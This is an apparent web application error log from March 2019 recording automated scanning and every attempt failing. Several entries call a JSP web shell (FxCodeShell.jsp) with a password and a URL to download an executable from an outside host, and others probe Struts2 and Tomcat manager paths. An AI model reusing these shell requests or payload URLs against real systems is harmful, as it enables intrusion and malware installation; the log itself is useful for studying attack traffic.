[ 2019-03-13T00:20:21+08:00 ] 211.149.200.11 /FxCodeShell.jsp%20
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T00:20:21+08:00 ] 211.149.200.11 /FxCodeShell.jsp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T00:20:21+08:00 ] 211.149.200.11 /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T00:25:51+08:00 ] 211.149.131.87 /struts2-rest-showcase/orders.xhtml
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Struts2-rest-showcase

[ 2019-03-13T00:25:51+08:00 ] 211.149.131.87 /index.action
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Index

[ 2019-03-13T00:25:51+08:00 ] 211.149.131.87 /index.do
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Index

[ 2019-03-13T00:26:03+08:00 ] 211.149.156.190 /struts2-rest-showcase/orders.xhtml
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Struts2-rest-showcase

[ 2019-03-13T00:26:03+08:00 ] 211.149.156.190 /index.action
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Index

[ 2019-03-13T00:26:03+08:00 ] 211.149.156.190 /index.do
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Index

[ 2019-03-13T03:07:41+08:00 ] 211.149.215.159 /FxCodeShell.jsp%20
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T03:07:41+08:00 ] 211.149.215.159 /FxCodeShell.jsp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T03:07:41+08:00 ] 211.149.215.159 /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T04:11:14+08:00 ] 211.149.156.190 /FxCodeShell.jsp%20
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T04:11:14+08:00 ] 211.149.156.190 /FxCodeShell.jsp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T04:11:14+08:00 ] 211.149.156.190 /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T05:13:34+08:00 ] 211.149.172.16 /FxCodeShell.jsp%20
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T05:13:34+08:00 ] 211.149.172.16 /FxCodeShell.jsp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T05:13:34+08:00 ] 211.149.172.16 /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T06:00:54+08:00 ] 211.149.203.72 /FxCodeShell.jsp%20
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T06:00:54+08:00 ] 211.149.203.72 /FxCodeShell.jsp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T06:00:54+08:00 ] 211.149.203.72 /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T07:32:41+08:00 ] 211.149.134.235 /struts2-rest-showcase/orders.xhtml
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Struts2-rest-showcase

[ 2019-03-13T07:32:41+08:00 ] 211.149.134.235 /index.action
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Index

[ 2019-03-13T07:32:41+08:00 ] 211.149.134.235 /index.do
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Index

[ 2019-03-13T07:59:36+08:00 ] 211.149.134.235 /struts2-rest-showcase/orders.xhtml
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Struts2-rest-showcase

[ 2019-03-13T07:59:36+08:00 ] 211.149.134.235 /index.action
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Index

[ 2019-03-13T07:59:36+08:00 ] 211.149.134.235 /index.do
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Index

[ 2019-03-13T08:32:50+08:00 ] 211.149.203.249 /struts2-rest-showcase/orders.xhtml
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Struts2-rest-showcase

[ 2019-03-13T08:32:50+08:00 ] 211.149.203.249 /index.action
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Index

[ 2019-03-13T08:32:50+08:00 ] 211.149.203.249 /index.do
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Index

[ 2019-03-13T10:54:52+08:00 ] 211.149.136.131 /struts2-rest-showcase/orders.xhtml
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Struts2-rest-showcase

[ 2019-03-13T10:54:52+08:00 ] 211.149.136.131 /index.action
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Index

[ 2019-03-13T10:54:52+08:00 ] 211.149.136.131 /index.do
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Index

[ 2019-03-13T11:58:29+08:00 ] 189.254.230.67 /manager/html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Manager

[ 2019-03-13T12:02:03+08:00 ] 58.222.50.94 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Favicon

[ 2019-03-13T12:55:03+08:00 ] 211.149.209.169 /struts2-rest-showcase/orders.xhtml
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Struts2-rest-showcase

[ 2019-03-13T12:55:03+08:00 ] 211.149.209.169 /index.action
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Index

[ 2019-03-13T12:55:03+08:00 ] 211.149.209.169 /index.do
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Index

[ 2019-03-13T14:28:07+08:00 ] 211.149.154.198 /struts2-rest-showcase/orders.xhtml
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Struts2-rest-showcase

[ 2019-03-13T14:28:07+08:00 ] 211.149.154.198 /index.action
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Index

[ 2019-03-13T14:28:07+08:00 ] 211.149.154.198 /index.do
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Index

[ 2019-03-13T15:11:51+08:00 ] 211.149.215.159 /struts2-rest-showcase/orders.xhtml
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Struts2-rest-showcase

[ 2019-03-13T15:11:51+08:00 ] 211.149.215.159 /index.action
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Index

[ 2019-03-13T15:11:51+08:00 ] 211.149.215.159 /index.do
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Index

[ 2019-03-13T16:18:04+08:00 ] 114.135.192.152 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Favicon

[ 2019-03-13T16:18:04+08:00 ] 114.135.192.152 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Favicon

[ 2019-03-13T16:36:37+08:00 ] 211.149.133.237 /FxCodeShell.jsp%20
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T16:36:37+08:00 ] 211.149.133.237 /FxCodeShell.jsp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T16:36:37+08:00 ] 211.149.133.237 /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T17:12:51+08:00 ] 213.128.88.99 /manager/html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Manager

[ 2019-03-13T20:51:27+08:00 ] 211.149.184.248 /FxCodeShell.jsp%20
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T20:51:27+08:00 ] 211.149.184.248 /FxCodeShell.jsp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T20:51:27+08:00 ] 211.149.184.248 /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T21:15:40+08:00 ] 211.149.183.220 /FxCodeShell.jsp%20
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T21:15:40+08:00 ] 211.149.183.220 /FxCodeShell.jsp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T21:15:40+08:00 ] 211.149.183.220 /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T21:29:49+08:00 ] 220.189.249.66 /manager/html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
ERR: 无法加载模块:Manager

